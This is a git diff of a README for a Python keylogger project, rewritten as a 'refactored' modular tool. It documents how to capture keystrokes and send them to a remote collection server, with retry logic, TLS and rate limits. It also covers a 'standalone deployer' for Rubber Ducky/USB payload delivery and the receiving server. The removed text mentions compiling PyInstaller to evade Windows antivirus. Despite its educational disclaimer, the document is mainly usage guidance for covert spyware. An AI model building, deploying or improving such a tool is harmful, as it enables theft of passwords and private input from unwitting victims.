@@ -1,13 +1,178 @@
-# Simple Python Keylogger with Pynput. Sending data to a server.
-## This code DOES NOT promote or encourage any illegal activities! The content in this document is provided solely for educational purposes and to create awareness!
+# Python Keylogger - Refactored
 
-## This is a proof of concept and could be improved on in a lot of ways.
+> **⚠️ Educational purposes only!** Use only on systems you own or have explicit permission to test. Unauthorized keylogging is illegal in most jurisdictions.
 
-1. To run this code use `git clone https://github.com/davidbombal/python-keylogger.git`
-2. Run the command `cd python-keylogger`
-3. Create Virtual Environment in Windows. Using command `<python_path>\py -m venv keylogger_env`
-4. Run command `keylogger_env\Scripts\activate`
-5. Run the command `pip install -r requirements.txt` to install all the packages required in your virtual environment.
-6. Run `py keylogger.py` this will run the program.
+A modular, configurable Python keylogger with proper package structure, structured logging, TLS support, and graceful shutdown handling.
 
-### To get the file to run on Windows 11 evading the antivirus I compiled the PyInstaller bootloader locally using Microsoft C/C++ compiler, and then used it to compile the code.
+## Features
+
+- **Modular Architecture**: Clean package structure with separated concerns
+- **Configuration via Environment Variables**: No hardcoded values
+- **Structured Logging**: Console and rotating file logging with configurable levels
+- **TLS/SSL Support**: Secure communication with certificate validation
+- **Retry Logic**: Exponential backoff with jitter for network resilience
+- **Rate Limiting**: Configurable character limit per interval
+- **Graceful Shutdown**: Signal handling (SIGINT, SIGTERM) and ESC key to stop
+- **Thread-Safe**: Proper locking for concurrent operations
+- **Type Hints**: Full type annotations for better maintainability
+
+## Project Structure
+
+```
+python-keylogger/
+├── keylogger/                 # Main package
+│   ├── __init__.py           # Package exports
+│   ├── __main__.py           # Entry point: python -m keylogger
+│   ├── config.py             # Configuration & validation
+│   ├── logger.py             # Structured logging setup
+│   ├── buffer.py             # Thread-safe keystroke buffer
+│   ├── client.py             # HTTP client with retry logic
+│   ├── core.py               # Main keylogger class
+│   └── server.py             # HTTP server for receiving data
+├── keylogger_standalone.py   # Deployer for Rubber Ducky/USB
+├── keylogger_server.py       # Legacy server (kept for compatibility)
+├── keylogger_configurable.py # Legacy configurable version (kept for compatibility)
+├── keylogger.py              # Legacy basic version (kept for compatibility)
+├── requirements.txt          # Dependencies
+└── ducky_payload_*.txt       # Rubber Ducky payloads
+```
+
+## Installation
+
+```bash
+# Clone and enter directory
+git clone <repository-url>
+cd python-keylogger
+
+# Create virtual environment (recommended)
+python3 -m venv venv
+source venv/bin/activate  # On Windows: venv\Scripts\activate
+
+# Install dependencies
+pip install -r requirements.txt
+```
+
+## Usage
+
+### Basic Keylogger (Package Module)
+
+Configure via environment variables:
+
+```bash
+# Required
+export KEYLOGGER_IP="192.168.1.100"
+export KEYLOGGER_PORT="8080"
+
+# Optional
+export KEYLOGGER_INTERVAL="10"           # Send interval in seconds
+export KEYLOGGER_USE_TLS="false"         # Enable TLS
+export KEYLOGGER_VERIFY_SSL="true"       # Verify SSL certificates
+export KEYLOGGER_CA_CERT="/path/ca.pem"  # CA certificate
+export KEYLOGGER_CLIENT_CERT="/path/client.pem"
+export KEYLOGGER_CLIENT_KEY="/path/key.pem"
+export KEYLOGGER_LOG_LEVEL="INFO"        # DEBUG, INFO, WARNING, ERROR, CRITICAL
+export KEYLOGGER_LOG_FILE="/var/log/keylogger.log"
+export KEYLOGGER_RATE_LIMIT="10000"      # Max chars per interval
+
+# Run
+python -m keylogger
+```
+
+Or run with inline environment variables:
+
+```bash
+KEYLOGGER_IP=192.168.1.100 KEYLOGGER_PORT=8080 python -m keylogger
+```
+
+### Standalone Deployer (for Rubber Ducky / USB)
+
+```bash
+# With CLI arguments
+python keylogger_standalone.py --server 192.168.1.100 --port 8080 --interval 10
+
+# With TLS
+python keylogger_standalone.py --server 192.168.1.100 --port 8443 --tls \
+  --ca-cert /path/ca.pem --client-cert /path/client.pem --client-key /path/key.pem
+
+# Skip dependency installation (if already installed)
+python keylogger_standalone.py --server 192.168.1.100 --skip-deps
+```
+
+### HTTP Server (Receiving Data)
+
+```bash
+# Basic usage
+python -m keylogger.server
+
+# With options
+python -m keylogger.server --host 0.0.0.0 --port 8080 --log-file keylogger_log.txt --log-level DEBUG
+```
+
+Or use the legacy server:
+
+```bash
+python keylogger_server.py [port]
+```
+
+## Configuration Options
+
+| Environment Variable | CLI Argument | Default | Description |
+|---------------------|--------------|---------|-------------|
+| `KEYLOGGER_IP` | `--server` | `127.0.0.1` | Server IP address |
+| `KEYLOGGER_PORT` | `--port` | `8080` | Server port |
+| `KEYLOGGER_INTERVAL` | `--interval` | `10` | Send interval (seconds) |
+| `KEYLOGGER_USE_TLS` | `--tls` | `false` | Enable TLS/SSL |
+| `KEYLOGGER_VERIFY_SSL` | `--verify-ssl`/`--no-verify-ssl` | `true` | Verify SSL certificates |
+| `KEYLOGGER_CA_CERT` | `--ca-cert` | `None` | CA certificate path |
+| `KEYLOGGER_CLIENT_CERT` | `--client-cert` | `None` | Client certificate path |
+| `KEYLOGGER_CLIENT_KEY` | `--client-key` | `None` | Client key path |
+| `KEYLOGGER_LOG_LEVEL` | `--log-level` | `INFO` | Log level |
+| `KEYLOGGER_LOG_FILE` | `--log-file` | `None` | Log file path |
+| `KEYLOGGER_RATE_LIMIT` | `--rate-limit` | `10000` | Max chars per interval |
+| `KEYLOGGER_MAX_RETRIES` | - | `3` | Max retry attempts |
+| `KEYLOGGER_BASE_BACKOFF` | - | `1.0` | Initial backoff (seconds) |
+| `KEYLOGGER_MAX_BACKOFF` | - | `60.0` | Max backoff (seconds) |
+
+## Special Keys Handled
+
+- **Navigation**: Enter, Tab, Space, Arrow keys, Home, End, Page Up/Down
+- **Modifiers**: Shift, Ctrl, Alt, Cmd/Win (suppressed)
+- **Function Keys**: F1-F12
+- **Special**: ESC (stops keylogger), Backspace, Delete, Insert, Caps Lock, Num Lock, Scroll Lock, Print Screen, Pause, Menu
+- **Control Characters**: Logged as `[CTRL:<code>]`
+
+## Development
+
+```bash
+# Install dev dependencies
+pip install pytest black mypy
+
+# Run type checking
+mypy keylogger/
+
+# Format code
+black keylogger/
+
+# Run tests (when available)
+pytest
+```
+
+## Legacy Files
+
+The following files are kept for backward compatibility but are **deprecated**:
+
+- `keylogger.py` - Basic version with hardcoded values and global variables
+- `keylogger_configurable.py` - Previous configurable version (now split into package)
+- `keylogger_server.py` - Legacy server (use `python -m keylogger.server` instead)
+
+## Security Considerations
+
+- **TLS**: Always use TLS in production (`KEYLOGGER_USE_TLS=true`)
+- **Certificate Validation**: Keep `KEYLOGGER_VERIFY_SSL=true` (default)
+- **Rate Limiting**: Prevents buffer overflow attacks
+- **Input Sanitization**: Control characters are escaped
+- **Least Privilege**: Run with minimal required permissions
+
+## License
+
+This project is for educational and authorized testing purposes only.
